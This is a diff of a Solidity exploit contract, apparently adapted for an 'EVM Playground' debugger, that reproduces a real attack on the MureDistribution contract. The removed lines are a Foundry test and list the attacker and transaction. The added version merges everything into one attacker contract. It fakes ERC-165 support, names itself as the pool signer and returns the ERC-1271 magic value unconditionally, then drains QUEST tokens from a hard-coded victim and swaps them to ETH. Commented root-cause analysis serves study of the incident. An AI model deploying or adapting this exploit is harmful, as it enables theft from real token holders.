@@ -1,84 +1,47 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import {Test} from "forge-std/Test.sol";
-import {console} from "forge-std/console.sol";
-import {IERC20} from "forge-std/interfaces/IERC20.sol";
-
-// @KeyInfo - Total Lost : ~5.45 ETH
-// Attacker : https://etherscan.io/address/0x08096e9ae70d7c5f2707b203a7801b75d1412156
-// Attack Contract : https://etherscan.io/address/0x2b896760f8ad2ecf58ef93bdf71ac5e85c2b7f63
-// Vulnerable Contract : https://etherscan.io/address/0x365083717efb17f3895290ba38f20f568c7a4d8a
-// Attack Tx : https://etherscan.io/tx/0xb83040361a0ec72fa2d06ad69493226518a5f8b5d96c19b400626248f9c5b798
+// Synthetic standalone exploit for the EVM Playground (2026-05-MureDistribution).
+// Adapted from the real registry PoC (test/MureDistribution_exp.sol). Two
+// changes from the real PoC:
+//  1. The real PoC runs the whole attack inside the `MureDistributionExploit`
+//     constructor, which the recorder cannot step through opcode-by-opcode.
+//     Here the attack is moved into an external `attack()` entrypoint, gated
+//     on `msg.sender == owner` like the original.
+//  2. The real PoC splits the "forged pool/signer/recipient" role into a
+//     second, separately-deployed `MureSignerSource` contract. Functionally
+//     the split is not required - ERC-1271 self-attestation and the
+//     ERC-165 self-declaration work identically whether the attacker uses a
+//     second contract or attests about itself directly - so this synthetic
+//     version merges everything into ONE contract (deployed as
+//     `MureDistributionExploit`, matching `syntheticExploit.contractName`)
+//     so the recorder/debugger can resolve every editorial beat against a
+//     single deployed address.
 //
-// @Info
-// Vulnerable Contract Code : https://etherscan.io/address/0x365083717efb17f3895290ba38f20f568c7a4d8a#code
-//
-// @Analysis
-// Post-mortem : N/A
-// Twitter Guy : https://x.com/DefimonAlerts/status/2058211424761942226
+// Root cause: MureDistribution.distribute() reads BOTH the signature verifier
+// (`source.poolState().signer`) AND the ERC-1271 attestation (`signer.isValidSignature`)
+// from a single caller-supplied `source` contract, gated only by a self-declared
+// ERC-165 `supportsInterface`. An attacker contract that answers all three calls
+// about itself becomes simultaneously the "pool", the "signer", and forges its
+// own authorization, then pulls `amount` of `token` from `repository` (chosen by
+// the attacker) to `to` (also attacker-chosen).
 
-contract MureDistributionTest is Test {
-    bytes32 internal constant TX_HASH = 0xb83040361a0ec72fa2d06ad69493226518a5f8b5d96c19b400626248f9c5b798;
-    uint256 internal constant FORK_BLOCK = 25_141_106;
-    uint256 internal constant TX_TIMESTAMP = 1_779_336_287;
-    address internal constant ATTACKER = 0x08096e9ae70D7C5F2707b203A7801b75d1412156;
-    address internal constant VICTIM = 0x29b0a315924E05aC0c898a63D96daA33CfD1cAc7;
-    address internal constant MURE_DISTRIBUTION = 0x365083717eFB17F3895290BA38f20F568C7A4D8a;
-    IERC20 internal constant QUEST = IERC20(0x1Fc122FE8b6Fa6b8598799baF687539b5D3B2783);
-
-    uint256 internal constant DRAINED_QUEST = 4_848_683_803_036;
-
-    function setUp() public {
-        vm.createSelectFork("http://127.0.0.1:8545", FORK_BLOCK);
-        vm.warp(TX_TIMESTAMP);
-        vm.deal(ATTACKER, 0);
-
-        vm.label(ATTACKER, "Attacker");
-        vm.label(VICTIM, "Victim");
-        vm.label(MURE_DISTRIBUTION, "MureDistribution Proxy");
-        vm.label(address(QUEST), "QUEST");
-    }
-
-    function testExploit() public {
-        uint256 beforeEth = ATTACKER.balance;
-        uint256 beforeVictimQuest = QUEST.balanceOf(VICTIM);
-
-        vm.prank(ATTACKER, ATTACKER);
-        new MureDistributionExploit(ATTACKER);
-
-        uint256 stolenQuest = beforeVictimQuest - QUEST.balanceOf(VICTIM);
-        uint256 ethProfit = ATTACKER.balance - beforeEth;
-
-        assertEq(stolenQuest, DRAINED_QUEST, "QUEST drain mismatch");
-        assertGt(ethProfit, 5 ether, "ETH profit too low");
-
-        console.log("Stolen QUEST", stolenQuest);
-        console.log("Profit ETH", ethProfit);
-    }
+interface IERC20Min {
+    function balanceOf(address) external view returns (uint256);
+    function approve(address, uint256) external returns (bool);
 }
 
 contract MureDistributionExploit {
-    constructor(address attacker) payable {
-        MureSignerSource source = new MureSignerSource(address(this));
-        source.attack();
-
-        (bool ok,) = attacker.call{value: address(this).balance}("");
-        require(ok, "eth transfer failed");
-    }
-
-    receive() external payable {}
-}
-
-contract MureSignerSource {
     bytes4 internal constant ERC1271_MAGIC_VALUE = 0x1626ba7e;
     bytes4 internal constant ERC165_INTERFACE_ID = 0x01ffc9a7;
     bytes4 internal constant MURE_POOL_INTERFACE_ID = 0x10704b42;
 
     address internal constant VICTIM = 0x29b0a315924E05aC0c898a63D96daA33CfD1cAc7;
-    IMureDistribution internal constant MURE_DISTRIBUTION = IMureDistribution(0x365083717eFB17F3895290BA38f20F568C7A4D8a);
-    IUniswapV3Router internal constant UNISWAP_V3_ROUTER = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
-    IERC20 internal constant QUEST = IERC20(0x1Fc122FE8b6Fa6b8598799baF687539b5D3B2783);
+    IMureDistribution internal constant MURE_DISTRIBUTION =
+        IMureDistribution(0x365083717eFB17F3895290BA38f20F568C7A4D8a);
+    IUniswapV3Router internal constant UNISWAP_V3_ROUTER =
+        IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+    IERC20Min internal constant QUEST = IERC20Min(0x1Fc122FE8b6Fa6b8598799baF687539b5D3B2783);
     address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
     IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
 
@@ -95,6 +58,10 @@ contract MureSignerSource {
     function attack() external {
         require(msg.sender == owner, "not owner");
 
+        // `source` is this contract itself - it will be asked (below, inside
+        // MureDistribution) to self-declare PoolMetadata support, report ITSELF
+        // as the pool's `signer`, and then attest via ERC-1271 to its own
+        // forged authorization.
         MURE_DISTRIBUTION.distribute(
             IMureDistribution.Distribution({
                 token: address(QUEST),
@@ -125,21 +92,31 @@ contract MureSignerSource {
         require(ok, "owner eth transfer failed");
     }
 
-    function poolState(string calldata) external view returns (uint256, uint256, uint256, uint256, uint256, address, uint256, address){
+    // Called BY MureDistribution on `source` (this contract) to learn the
+    // pool's "signer" - which this attacker answers with its own address.
+    function poolState(string calldata)
+        external
+        view
+        returns (uint256, uint256, uint256, uint256, uint256, address, uint256, address)
+    {
         return (0, 0, 0, 0, 0, address(QUEST), 0, address(this));
     }
 
-    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4){
+    // Called BY MureDistribution's SignatureChecker as the ERC-1271 fallback,
+    // since `signer` above resolved to this same contract. Unconditionally
+    // returns the magic value, so an empty signature "verifies".
+    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
         return ERC1271_MAGIC_VALUE;
     }
 
+    // Called BY ERC165Checker.supportsInterface() as the ONLY gate on `source`
+    // before MureDistribution trusts it as a pool.
     function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
         return interfaceId == ERC165_INTERFACE_ID || interfaceId == MURE_POOL_INTERFACE_ID;
     }
 
     receive() external payable {}
 }
-
 
 interface IMureDistribution {
     struct Distribution {
@@ -167,6 +144,6 @@ interface IUniswapV3Router {
     function exactInput(ExactInputParams calldata params) external payable returns (uint256 amountOut);
 }
 
-interface IWETH is IERC20 {
+interface IWETH is IERC20Min {
     function withdraw(uint256 wad) external;
 }
